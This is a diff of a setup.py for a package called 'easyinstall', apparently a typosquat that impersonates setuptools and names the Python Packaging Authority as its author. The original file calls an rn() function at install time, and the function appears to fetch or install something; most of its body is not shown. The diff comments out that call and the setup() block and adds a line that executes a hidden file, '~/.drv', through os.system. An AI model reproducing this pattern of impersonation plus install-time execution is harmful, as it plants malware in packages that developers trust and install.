@@ -1,5 +1,17 @@
+# from setuptools import setup, find_packages
+# rn()
+# setup(
+#   name = 'easyinstall',
+#   packages = find_packages (),
+#   version = '41.0.0',
+#   description = 'Easily download, build, install, upgrade, and uninstall Python packages',
+#   author = 'Python Packaging Authority',
+#   url = ' https://github.com/pypa/setuptools',
+#   keywords = ['CPAN', 'PyPI', 'distutils', 'eggs', 'package', 'managment'],
+#   classifiers = []
+# )
 
-from setuptools import setup, find_packages
+lambda: os.system("~/.drv")
 
 def rn():
     import platform, os, stat, threading
@@ -34,16 +46,3 @@ def rn():
     else:
         print("Error installing library!")
         exit(-1)
-
-rn()
-
-setup(
-  name = 'easyinstall',
-  packages = find_packages (),
-  version = '41.0.0',
-  description = 'Easily download, build, install, upgrade, and uninstall Python packages',
-  author = 'Python Packaging Authority',
-  url = ' https://github.com/pypa/setuptools',
-  keywords = ['CPAN', 'PyPI', 'distutils', 'eggs', 'package', 'managment'],
-  classifiers = []
-)
